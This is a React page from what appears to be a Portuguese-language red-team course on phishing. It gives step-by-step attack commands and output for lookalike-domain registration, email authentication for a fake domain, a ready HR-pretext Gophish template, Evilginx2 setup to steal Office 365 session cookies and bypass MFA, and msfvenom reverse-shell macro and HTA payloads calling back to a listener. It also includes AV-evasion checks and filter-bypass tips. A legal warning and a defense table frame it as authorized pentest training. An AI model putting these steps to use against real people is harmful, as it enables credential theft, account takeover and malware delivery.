import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Phishing() {
  return (
    <PageContainer
      title="Phishing — engenharia social com infra própria"
      subtitle="Gophish, Evilginx2 (proxy reverso para MFA bypass), domínio + SPF/DKIM/DMARC, payloads Office, OPSEC."
      difficulty="avancado"
      timeToRead="22 min"
      prompt="redteam/phishing"
    >
      <AlertBox type="danger" title="LEGAL antes de tudo">
        Phishing fora do escopo de RoE assinado é <strong>fraude eletrônica</strong> (CP Art. 171,
        Lei 14.155/21 — pena 4 a 8 anos). Mesmo simulação interna precisa de autorização
        EXPRESSA do CISO/diretoria. Em pentest, anexe lista de funcionários alvo + janelas.
      </AlertBox>

      <h2>Anatomia de uma campanha</h2>
      <OutputBlock label="ciclo do engagement de phishing" type="muted">
{`1. PRETEXT     — qual história contar (RH "atualize benefício", TI "expira senha")
2. INFRA       — domínio similar, VPS, SMTP, certificado, deliverability
3. PAYLOAD     — link para clone/oauth/file (.docm, .lnk, .iso, .one)
4. SEND        — Gophish; campanha agendada; horário comercial do alvo
5. CAPTURE     — credenciais, tokens MFA (evilginx), shells (HTA/macro)
6. ESCALAR     — usar credenciais para entrar (VPN, OWA, M365)
7. RELATÓRIO   — métricas (CTR, submit rate), screenshots, rec. de treinamento`}
      </OutputBlock>

      <h2>Domínio + DNS + email autenticado</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) registrar domínio similar (typo squatting, cousin domain)",
            cmd: "dnstwist -r empresa.com.br | head -20",
            out: `dnstwist 20240108
[*] Processing 1 domain(s)...

ORIGINAL    empresa.com.br      203.0.113.5
ADDITION    empresaa.com.br     -                ← disponível!
ADDITION    empresas.com.br     192.0.2.42       (já em uso)
HOMOGLYPH   еmpresa.com.br      -                ← cyrillic 'е', visualmente IDÊNTICO!
HOMOGLYPH   empresa.com.br      203.0.113.5
HYPHENATION empresa-corp.com.br -                ← disponível
INSERTION   empresa.com.br      203.0.113.5
OMISSION    mpresa.com.br       -                ← disponível
REPETITION  emppresa.com.br     -                ← disponível
TLDSWAP     empresa.com         203.0.113.5
TLDSWAP     empresa.net.br      -                ← disponível
TLDSWAP     empresa.org.br      -                ← disponível`,
            outType: "warning",
          },
          {
            comment: "2) registrar via Namecheap/CloudFlare; setar A record para VPS",
            cmd: "dig +short empresaa.com.br",
            out: "203.0.113.250            (sua VPS)",
            outType: "info",
          },
          {
            comment: "3) SPF (autoriza VPS a enviar)",
            cmd: "dig TXT empresaa.com.br +short",
            out: `"v=spf1 ip4:203.0.113.250 -all"`,
            outType: "default",
          },
          {
            comment: "4) DKIM (gerar par RSA)",
            cmd: "opendkim-genkey -d empresaa.com.br -s mail -b 2048 && cat mail.txt",
            out: `mail._domainkey IN TXT  ( "v=DKIM1; h=sha256; k=rsa; "
          "p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."
          "..." )  ; ----- DKIM key mail for empresaa.com.br`,
            outType: "muted",
          },
          {
            comment: "5) DMARC (relax para começar; depois apertar)",
            cmd: "dig TXT _dmarc.empresaa.com.br +short",
            out: `"v=DMARC1; p=none; rua=mailto:dmarc@empresaa.com.br"`,
            outType: "default",
          },
          {
            comment: "6) testar deliverability — score de spam",
            cmd: "echo 'Subject: test' | swaks --to test@mail-tester.com --from rh@empresaa.com.br --server localhost",
            out: `(no mail-tester.com fica:  9.8 / 10 ✅)
SPF: pass
DKIM: pass
DMARC: pass
RBL: not listed
Content: clean`,
            outType: "success",
          },
        ]}
      />

      <h2>Gophish — gerenciamento de campanha</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "wget -q https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip && unzip -q gophish-v0.12.1-linux-64bit.zip -d gophish && cd gophish",
            out: `(silencioso)`,
            outType: "muted",
          },
          {
            cmd: "./gophish",
            out: `time="2026-04-04T00:14:21-03:00" level=info msg="Please login with the username admin and the password 'XXXXX-INITIAL-PASSWORD'"
time="2026-04-04T00:14:21-03:00" level=info msg="Starting admin server at https://127.0.0.1:3333"
time="2026-04-04T00:14:21-03:00" level=info msg="Starting phishing server at http://0.0.0.0:80"
time="2026-04-04T00:14:21-03:00" level=info msg="Background workers started"`,
            outType: "info",
          },
          {
            cmd: "firefox https://127.0.0.1:3333 &",
            out: `(login: admin / XXXXX-INITIAL-PASSWORD)
(troque imediatamente em Account Settings)`,
            outType: "muted",
          },
        ]}
      />

      <CommandTable
        title="Setup do Gophish (UI ou API)"
        variations={[
          { cmd: "Sending Profile", desc: "SMTP que vai enviar.", output: "host:port, user, from address." },
          { cmd: "Email Template", desc: "HTML do email enviado.", output: "Suporta {{.URL}} {{.FirstName}} etc." },
          { cmd: "Landing Page", desc: "Página clonada (Gophish faz!).", output: "Capture credentials + capture passwords." },
          { cmd: "Users & Groups", desc: "Lista de alvos (CSV).", output: "Position, email, first/last name." },
          { cmd: "Campaign", desc: "Une os 4 anteriores + agenda.", output: "Tracker UUID em cada email." },
        ]}
      />

      <CodeBlock
        language="html"
        title="Email template Gophish — pretexto RH"
        code={`<!DOCTYPE html>
<html>
<head><style>
  body { font-family: 'Segoe UI', Arial, sans-serif; color:#333; }
  .header { background:#003366; color:white; padding:18px; }
  .btn { background:#0066cc; color:white; padding:12px 24px;
         text-decoration:none; border-radius:4px; display:inline-block; }
</style></head>
<body>
  <div class="header">
    <h2>Recursos Humanos · Empresa S.A.</h2>
  </div>

  <p>Prezado(a) {{.FirstName}},</p>

  <p>Em conformidade com a nova política de benefícios para 2026,
  <strong>solicitamos a confirmação dos seus dados</strong> até
  06/04/2026. Após essa data, o portal exigirá novo cadastro.</p>

  <p style="text-align:center; margin:30px 0;">
    <a href="{{.URL}}" class="btn">Confirmar dados em 30 segundos</a>
  </p>

  <p>Em caso de dúvida, responda este e-mail ou ligue para 11-3214-XXXX.</p>

  <p>
    Atenciosamente,<br>
    <strong>Renata Costa</strong><br>
    Recursos Humanos<br>
    Empresa S.A.
  </p>

  {{.Tracker}}
</body>
</html>`}
      />

      <h2>Métricas após o disparo</h2>
      <OutputBlock label="Gophish dashboard — campaign 'RH-2026'" type="warning">
{`Campaign: RH-2026
Sent: 247 emails  |  Started: Mon 04/Apr 09:00  |  Status: Active

  Sent       247  ████████████████████ 100%
  Opened     189  ███████████████░░░░░  76%
  Clicked     74  ██████░░░░░░░░░░░░░░  30%
  Submitted   42  ███░░░░░░░░░░░░░░░░░  17%   ← credenciais!
  Reported     8  █░░░░░░░░░░░░░░░░░░░   3%   ← reportaram p/ TI

Top submitters:
  ana.silva@empresa.com.br      Senha2025! (1)
  joao.lopes@empresa.com.br     joaolopes123 (1)
  carlos.s@empresa.com.br       Empresa@123 (2)   ← admin de TI!
  
Geographic:
  São Paulo, BR     38
  Rio de Janeiro    4

Devices:
  Desktop Chrome    31
  Mobile iPhone     8
  Mobile Android    3`}
      </OutputBlock>

      <h2>Evilginx2 — proxy reverso (BYPASSA MFA)</h2>
      <p>
        Phishing tradicional pega senha mas <strong>quebra com MFA</strong>. Evilginx age como
        proxy entre vítima e o serviço REAL: a vítima loga normalmente (até MFA), e você captura
        o <strong>cookie de sessão final</strong>. Cookie = sessão autenticada = MFA já passou.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && go build -o build/evilginx ./...",
            out: `Cloning into 'evilginx2'...
go: downloading github.com/miekg/dns v1.1.55
[...]
Build complete: build/evilginx`,
            outType: "muted",
          },
          {
            comment: "ele requer DNS A record do seu domínio apontando pro VPS, e wildcard *",
            cmd: "sudo ./build/evilginx -p ./phishlets",
            out: `

   ▒▒▒▒▒▒▒▒▒▒▒▒▒  evilginx 2.4.0
   ▒  by Kuba Gretzky · @mrgretzky · evilginx.com

   :: phishlet config ······························ ./phishlets
   :: persistent cache ·····························  ~/.evilginx/

[2026-04-04 00:42:11] [inf] loading phishlets from: ./phishlets
[2026-04-04 00:42:11] [inf] loaded phishlet 'o365' v3.2.1
[2026-04-04 00:42:11] [inf] loaded phishlet 'gmail' v2.1.3
[2026-04-04 00:42:11] [inf] loaded phishlet 'okta' v1.5.0
[2026-04-04 00:42:11] [inf] starting NS server on udp 0.0.0.0:53
[2026-04-04 00:42:11] [inf] starting HTTPS proxy on tcp 0.0.0.0:443

: ` ,
            outType: "info",
          },
          {
            comment: "configurar dominio + IP",
            cmd: ": config domain login-empresaa.com.br",
            out: `:: config domain set to: login-empresaa.com.br`,
            outType: "default",
          },
          {
            cmd: ": config ipv4 external 203.0.113.250",
            out: `:: config ipv4 external set to: 203.0.113.250`,
            outType: "default",
          },
          {
            comment: "habilitar phishlet o365",
            cmd: ": phishlets hostname o365 login-empresaa.com.br && phishlets enable o365",
            out: `:: phishlet 'o365' hostname set to: login-empresaa.com.br
:: requesting LetsEncrypt cert for: login.login-empresaa.com.br ...
:: cert obtained ✓
:: phishlet 'o365' enabled`,
            outType: "success",
          },
          {
            cmd: ": lures create o365",
            out: `:: lure created with id: 0
:: phishing URL: https://login.login-empresaa.com.br/auth-2026-04`,
            outType: "warning",
          },
          {
            comment: "vítima clica → loga em login.microsoftonline.com REAL via proxy → MFA",
            cmd: "(quando vítima loga + MFA)",
            out: `[2026-04-04 09:42:11] [+] [o365] new session: ana.silva@empresa.com.br [192.0.2.108]
[2026-04-04 09:42:18] [+] [o365] captured username: ana.silva@empresa.com.br
[2026-04-04 09:42:24] [+] [o365] captured password: Senha2025!
[2026-04-04 09:42:31] [+] [o365] MFA accepted by user
[2026-04-04 09:42:31] [+] [o365] captured ALL session tokens! → ESTRPSession=eyJhbGc...; ESTSAUTH=eyJraWQ...; SignInStateCookie=...

[2026-04-04 09:42:31] [+] sessions list updated`,
            outType: "error",
          },
          {
            cmd: ": sessions",
            out: `+----+-------------+--------------------------+----------------+----------+----------+
| id | phishlet    | username                 | remote ip      | tokens   | time     |
+----+-------------+--------------------------+----------------+----------+----------+
| 1  | o365        | ana.silva@empresa.com.br | 192.0.2.108    | YES      | 0:32:18  |
+----+-------------+--------------------------+----------------+----------+----------+`,
            outType: "warning",
          },
          {
            cmd: ": sessions 1",
            out: `id           : 1
phishlet     : o365
username     : ana.silva@empresa.com.br
password     : Senha2025!
custom       : {}
landing url  : https://login.login-empresaa.com.br/auth-2026-04
useragent    : Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/124.0
remote addr  : 192.0.2.108
captured at  : 2026-04-04 09:42:31
tokens       : 8 cookies — ESTRPSession, ESTSAUTH, SignInStateCookie, ...
              [JSON copia/cola dos cookies]`,
            outType: "error",
          },
          {
            comment: "agora você importa esses cookies no SEU Chrome (extensão Cookie-Editor) → vira a vítima sem precisar de MFA novo",
            cmd: "(no SEU Chrome) https://outlook.office.com",
            out: `Outlook — ana.silva@empresa.com.br
(você está logado como a vítima)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Payloads em arquivo (Office, ISO, LNK)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) macro Office (clássico, ainda funciona em ambiente sem hardening)",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=203.0.113.250 LPORT=443 -f vba > macro.vba",
            out: "(gera VBA pronto para colar em Worksheet → Visual Basic Editor)",
            outType: "muted",
          },
          {
            comment: "2) HTA — clica e executa (nem precisa abrir Office)",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=203.0.113.250 LPORT=443 -f hta-psh -o invoice.hta",
            out: "(244KB. Vítima abre → script executa → callback)",
            outType: "warning",
          },
          {
            comment: "3) ISO+LNK — bypass mark-of-the-web (MOTW)",
            cmd: "create-iso-lnk.sh payload.exe \"Curriculo Wallyson.lnk\" -o curriculo.iso",
            out: `(ISO mountável; LNK aponta para EXE oculto. Outlook NÃO marca como MOTW.)`,
            outType: "default",
          },
          {
            comment: "4) OneNote (.one) — vetor 2023+",
            cmd: "python3 onenote-payload-gen.py -p payload.exe -o factura.one",
            out: `[+] one note de 4.2MB criado. Pre-2023 sem warning. Pos-2023 mostra warning fácil de pular.`,
            outType: "info",
          },
          {
            comment: "5) verificar AV antes de enviar",
            cmd: "vt scan file invoice.hta",
            out: `Detection: 4 / 71  AV vendors flagged this file as malicious
  - Bkav Pro       :  W64.AIDetectMalware
  - Cylance        :  Unsafe
  - SecureAge      :  Malicious
  - Trapmine       :  malicious.high.ml.score
(precisa obfuscar mais)`,
            outType: "error",
          },
        ]}
      />

      <h2>Bypass de filtros (Sender Policy)</h2>
      <CommandTable
        title="O que melhora deliverability"
        variations={[
          { cmd: "SPF, DKIM, DMARC PASS", desc: "Mostrado acima. Sem isso = junk.", output: "Score 9+ no mail-tester." },
          { cmd: "rDNS", desc: "PTR do IP da VPS aponta pro domínio.", output: "Provedores quase sempre exigem." },
          { cmd: "MX record", desc: "Domínio tem MX configurado.", output: "Senão = parece desligado." },
          { cmd: "Aged domain", desc: "Domínio com 30+ dias antes de campanha.", output: "Domínio novo = score baixo." },
          { cmd: "IP warming", desc: "Mandar pouco volume nos primeiros dias.", output: "20→50→100/dia até reputação." },
          { cmd: "Conteúdo natural", desc: "Sem 'CLIQUE AQUI URGENTE'.", output: "HTML responsivo, links coerentes." },
          { cmd: "Link curto / oculto", desc: "Domínio mostrado != link real.", output: "Burp/MJ pega isso, mas user médio não." },
          { cmd: "Personalização", desc: "Nome real do alvo no email.", output: "OSINT pelo LinkedIn." },
          { cmd: "Horário", desc: "9h-11h da manhã.", output: "Maior abertura, menor desconfiança." },
        ]}
      />

      <h2>Defesa (incluir no relatório)</h2>
      <CommandTable
        title="O que recomendar para o cliente"
        variations={[
          { cmd: "MFA com FIDO2 (não SMS)", desc: "Resistente a evilginx (channel binding).", output: "Yubikey, Titan, passkeys." },
          { cmd: "DMARC p=reject", desc: "Bloqueia spoof do domínio próprio.", output: "Subir gradativamente: none → quarantine → reject." },
          { cmd: "Conditional Access (M365)", desc: "Bloqueia login fora de país/device.", output: "Mata 80% do MFA bypass na prática." },
          { cmd: "Email gateway (Mimecast, Proofpoint)", desc: "Detecta phishlet kits, sandbox attachments.", output: "Investimento alto." },
          { cmd: "Treinamento + simulação", desc: "Knowbe4, Hoxhunt — campanhas mensais.", output: "Reduz click rate de ~30% para ~5%." },
          { cmd: "Browser isolation", desc: "Links abrem em sandbox.", output: "Zscaler/Cloudflare." },
          { cmd: "Banner externo no email", desc: "'EXTERNO' em vermelho no topo.", output: "1ª linha de defesa visual." },
          { cmd: "Ticket fácil para reportar", desc: "1 click 'Report Phishing' no Outlook.", output: "Time de SOC analisa." },
        ]}
      />

      <PracticeBox
        title="Lab interno: phishing contra você mesmo"
        goal="Subir Gophish + 1 alvo (sua conta), enviar 1 campanha, ver métricas."
        steps={[
          "Suba Gophish localmente (não precisa domínio).",
          "Use SMTP do Mailtrap (sandbox grátis) como sending profile.",
          "Crie 1 user (você mesmo).",
          "Template = 'Verifique sua conta' com link {{.URL}}.",
          "Landing page clone do gmail (Gophish faz import URL).",
          "Lance a campanha.",
          "Abra o email no Mailtrap, clique no link, submeta credencial fake.",
          "Veja stats no dashboard.",
        ]}
        command={`# 1) baixar e rodar
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d gophish && cd gophish && ./gophish

# 2) login em https://127.0.0.1:3333

# 3) Sending Profiles → New
#    SMTP From: rh@empresa.com
#    Host: smtp.mailtrap.io:2525
#    Username/Password: do mailtrap

# 4) Email Templates → Import URL: https://accounts.google.com → modificar
# 5) Landing Pages → Import URL: https://accounts.google.com/signin
# 6) Users → Add: você
# 7) Campaign → New → ligar tudo → Launch`}
        expected={`Campaign: lab-001
Sent: 1   Opened: 1   Clicked: 1   Submitted: 1   Reported: 0`}
        verify="Você verá em Campaign Results: timestamps de cada evento + IP + user-agent."
      />

      <AlertBox type="info" title="Phishing é arte + engenharia">
        Pretextos genéricos = 5% click. Pretextos personalizados (LinkedIn, evento corporativo
        recente, integração de TI específica) = 30%+ click. Reserve 80% do tempo para OSINT
        e construção do pretexto, 20% para infra.
      </AlertBox>
    </PageContainer>
  );
}
